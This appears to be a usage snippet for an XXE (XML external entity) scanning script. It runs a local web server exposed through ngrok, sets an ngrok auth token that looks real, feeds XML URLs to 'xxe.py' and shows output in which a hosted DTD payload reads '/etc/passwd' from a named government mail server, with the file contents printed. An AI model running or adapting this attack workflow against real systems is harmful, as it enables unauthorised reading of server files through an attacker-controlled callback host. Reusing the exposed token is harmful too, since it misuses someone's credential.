python -m http.server 80
ngrok http 80

```bash
# setup
ngrok config add-authtoken 2A9Qfg9LZ9SyvJ0CznsqA9LOUma_71EiLUpJBBkKsD5gqcm9r d
```
```bash
# start scaning
cat urls.txt | grep "\.xml$" | python xxe.py

[+] Total number of targets: 80
[+] Ngrok tunnel created: https://efbc-2401-4900-8fd1-eb7-4ea7-6ab9-146-ebe2.ngrok-free.app/exploit.dtd
[+] DTD payload file file generated with targets
[*] Target 1 : https://mail.aarogyasri.gov.in/Autodiscover/Autodiscover.xml
[+] Payload [file:///etc/passwd] sent 
    HTTP Status: 200
    Response Length: 345
[+] Response:
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
[+] Callback:

[*] Target 2 : https://mail.aarogyasri.gov.in/Autodiscover/Autodiscover.xml
[+] Payload [file:///etc/hosts] sent 
    HTTP Status: 400
    Response Length: 345
[+] Response:
[+] Callback:

[+] Cleaning up...
[+] Scan completed.
```